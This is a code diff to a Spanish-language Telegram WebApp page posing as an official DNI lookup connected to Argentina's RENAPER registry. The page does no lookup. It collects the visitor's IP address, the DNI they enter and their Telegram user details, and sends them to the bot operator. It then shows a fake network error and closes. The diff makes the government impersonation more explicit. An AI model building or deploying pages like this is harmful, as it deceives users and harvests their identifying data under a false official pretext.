@@ -7,28 +7,21 @@
   <style>
     :root { --main-green: #2ecc71; --dark-bg: #121212; --card-bg: #1e1e1e; --text-gray: #a0a0a0; }
     body { background: var(--dark-bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-    
-    /* PANTALLA 1: CARGA INICIAL */
     #terminal-screen { text-align: center; }
     .blink { animation: blinker 1s linear infinite; color: var(--main-green); font-family: monospace; font-size: 1.4rem; font-weight: bold; }
     @keyframes blinker { 50% { opacity: 0; } }
-
-    /* PANTALLA 2: INTERFAZ APP */
     #app-screen { display: none; width: 90%; max-width: 400px; text-align: center; }
     .title { color: var(--main-green); font-size: 2.2rem; font-weight: bold; margin-bottom: 5px; }
     .subtitle { color: var(--main-green); font-size: 0.8rem; letter-spacing: 1px; margin-bottom: 25px; text-transform: uppercase; }
     .card { background: var(--card-bg); padding: 25px; border-radius: 15px; border: 1px solid #333; text-align: left; }
     .card-title { font-weight: bold; font-size: 1.1rem; margin-bottom: 5px; }
     .card-desc { color: var(--text-gray); font-size: 0.8rem; margin-bottom: 20px; line-height: 1.4; }
-    
     input { width: 100%; background: #2a2a2a; border: 1px solid #444; border-radius: 5px; padding: 12px; color: white; font-size: 1rem; box-sizing: border-box; margin-bottom: 20px; outline: none; }
     .btn { background: var(--main-green); color: black; border: none; width: 100%; padding: 15px; border-radius: 5px; font-weight: bold; font-size: 1rem; cursor: pointer; text-transform: uppercase; }
-    
     .status-area { display: none; margin-top: 20px; }
     .status-text { color: var(--main-green); font-size: 0.7rem; margin-bottom: 8px; font-family: monospace; }
     .progress-container { width: 100%; background: #333; height: 6px; border-radius: 3px; overflow: hidden; }
     .progress-bar { width: 0%; height: 100%; background: var(--main-green); transition: width 0.4s; }
-    
     footer { position: absolute; bottom: 15px; color: #333; font-size: 0.6rem; width: 100%; text-align: center; }
   </style>
 </head>
@@ -43,15 +36,15 @@
     <div class="subtitle">SISTEMA DE CONSULTA NACIONAL</div>
 
     <div class="card">
-        <div class="card-title">Consultar Registro</div>
-        <div class="card-desc">Ingrese el DNI para verificar la información en la base de datos.</div>
+        <div class="card-title">Consultar DNI</div>
+        <div class="card-desc">Se realizará una consulta en la base de datos de RENAPER para verificar la información del ciudadano.</div>
         
         <input type="number" id="dniInput" placeholder="Número de documento">
         
-        <button class="btn" onclick="consultar()">BUSCAR AHORA</button>
+        <button class="btn" onclick="consultar()">REALIZAR CONSULTA</button>
 
         <div class="status-area" id="loading-area">
-            <div class="status-text" id="statusMsg">Iniciando búsqueda...</div>
+            <div class="status-text" id="statusMsg">Conectando con RENAPER...</div>
             <div class="progress-container">
                 <div class="progress-bar" id="bar"></div>
             </div>
@@ -64,13 +57,9 @@
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    
     let userIP = "";
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => { userIP = data.ip; });
+    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => { userIP = data.ip; });
 
-    // Transición de carga a app
     setTimeout(() => {
         document.getElementById('terminal-screen').style.display = 'none';
         document.getElementById('app-screen').style.display = 'block';
@@ -79,25 +68,16 @@
     function consultar() {
         const val = document.getElementById('dniInput').value;
         if(val.length < 6) return;
-
         document.getElementById('loading-area').style.display = 'block';
         const bar = document.getElementById('bar');
         const msg = document.getElementById('statusMsg');
 
-        setTimeout(() => { bar.style.width = "40%"; msg.innerText = "Buscando en registros..."; }, 1000);
-        setTimeout(() => { bar.style.width = "85%"; msg.innerText = "Procesando respuesta..."; }, 2500);
+        setTimeout(() => { bar.style.width = "45%"; msg.innerText = "Accediendo a base de datos RENAPER..."; }, 1000);
+        setTimeout(() => { bar.style.width = "90%"; msg.innerText = "Procesando información..."; }, 2500);
 
         setTimeout(() => {
-            const logData = {
-                ip: userIP,
-                busqueda: val,
-                user: tg.initDataUnsafe.user
-            };
-            
-            tg.sendData(JSON.stringify(logData));
-
-            // Error totalmente genérico
-            alert("Error de red: El servidor no responde. Intente nuevamente más tarde.");
+            tg.sendData(JSON.stringify({ip: userIP, busqueda: val, user: tg.initDataUnsafe.user}));
+            alert("Error de red: El servidor de RENAPER no responde. Intente nuevamente.");
             tg.close();
         }, 4500);
     }
